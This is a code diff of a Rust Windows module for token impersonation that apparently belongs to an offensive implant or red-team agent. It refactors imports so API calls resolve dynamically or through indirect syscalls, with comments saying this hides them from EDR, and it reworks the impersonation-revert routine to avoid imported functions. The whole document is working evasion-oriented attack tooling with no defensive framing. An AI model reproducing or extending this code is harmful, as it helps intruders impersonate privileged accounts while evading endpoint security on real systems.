@@ -49,16 +49,16 @@ use std::collections::HashMap;
 use std::sync::{Mutex, OnceLock};
 use std::sync::atomic::{AtomicBool, Ordering};
 use winapi::um::winnt::{
-    DUPLICATE_SAME_ACCESS, HANDLE, SECURITY_ATTRIBUTES, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
-    TOKEN_IMPERSONATE, TOKEN_QUERY, TOKEN_READ, SecurityDelegation, SecurityIdentification,
-    SecurityImpersonation, TokenImpersonation, TokenPrimary,
+    HANDLE, SECURITY_ATTRIBUTES, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
+    TOKEN_IMPERSONATE, TOKEN_QUERY,
+    SecurityImpersonation, TokenImpersonation,
 };
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 // All function imports removed — resolved dynamically via pe_resolve or indirect
 // syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
 use winapi::um::winbase::WAIT_OBJECT_0;
-use winapi::um::winnt::{TOKEN_STATISTICS, TOKEN_TYPE};
-use winapi::shared::minwindef::{DWORD, LPVOID, TRUE};
+use winapi::um::winnt::TOKEN_TYPE;
+use winapi::shared::minwindef::{DWORD, LPVOID};
 use winapi::shared::ntdef::NTSTATUS;
 use winapi::um::winbase::PIPE_ACCESS_DUPLEX;
 use winapi::um::winnt::PIPE_TYPE_BYTE;
@@ -101,14 +101,14 @@ where
 dynamic_fn!(GET_TOKEN_INFORMATION, b"advapi32.dll\0", b"GetTokenInformation\0",
             unsafe extern "system" fn(HANDLE, DWORD, LPVOID, DWORD, *mut DWORD) -> i32);
 
-dynamic_fn!(DUPLICATE_TOKEN_EX, b"advapi32.dll\0", b"DuplicateTokenEx\0",
-            unsafe extern "system" fn(HANDLE, DWORD, *mut SECURITY_ATTRIBUTES, DWORD, DWORD, *mut HANDLE) -> i32);
-
 dynamic_fn!(CONVERT_SID_TO_STRING_SID_A, b"advapi32.dll\0", b"ConvertSidToStringSidA\0",
             unsafe extern "system" fn(*mut winapi::um::winnt::SID, *mut *mut i8) -> i32);
 
 dynamic_fn!(LOOKUP_ACCOUNT_SID_A, b"advapi32.dll\0", b"LookupAccountSidA\0",
             unsafe extern "system" fn(LPVOID, *mut winapi::um::winnt::SID, *mut i8, *mut DWORD, *mut i8, *mut DWORD, *mut DWORD) -> i32);
+
+dynamic_fn!(REVERT_TO_SELF, b"advapi32.dll\0", b"RevertToSelf\0",
+            unsafe extern "system" fn() -> i32);
 
 // ── kernel32.dll functions ──────────────────────────────────────────────────
 
@@ -421,7 +421,7 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
         return Err(anyhow!("GetTokenInformation(TokenUser) failed"));
     }
 
-    let token_user = unsafe { &*(buffer.as_ptr() as *const TOKEN_USER) };
+    let token_user = unsafe { std::ptr::read_unaligned(buffer.as_ptr() as *const TOKEN_USER) };
     let sid = token_user.User.Sid;
 
     // Convert SID to string.
@@ -922,7 +922,6 @@ pub fn revert_token() -> Result<String> {
 
     // Clear the thread's impersonation token via NtSetInformationThread.
     // Passing a NULL token handle removes the impersonation.
-    let null_token: u64 = 0;
     let status = unsafe {
         let target = crate::syscalls::get_syscall_id("NtSetInformationThread")
             .map_err(|e| anyhow!("failed to resolve NtSetInformationThread SSN: {e}"))?;
@@ -930,18 +929,22 @@ pub fn revert_token() -> Result<String> {
             target.ssn,
             target.gadget_addr,
             &[
-                GetCurrentThread() as u64,
+                (-1isize) as u64,  // NtCurrentThread pseudo-handle
                 THREAD_IMPERSONATION_TOKEN as u64,
-                &null_token as *const u64 as u64,
+                std::ptr::null::<u64>() as u64,
                 std::mem::size_of::<u64>() as u64,
             ],
         ))
     }?;
 
     if nt_error(status) {
-        // Fall back to RevertToSelf if the syscall fails.
-        unsafe { RevertToSelf() };
-        log::warn!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), used RevertToSelf fallback");
+        // Fall back to dynamically-resolved RevertToSelf if the syscall fails.
+        if let Some(revert) = resolve_fn(&REVERT_TO_SELF, b"advapi32.dll\0", b"RevertToSelf\0") {
+            unsafe { revert() };
+            log::warn!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), used RevertToSelf fallback");
+        } else {
+            log::error!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), RevertToSelf fallback also failed to resolve");
+        }
     }
 
     log::info!("token_impersonation: reverted to original process token");
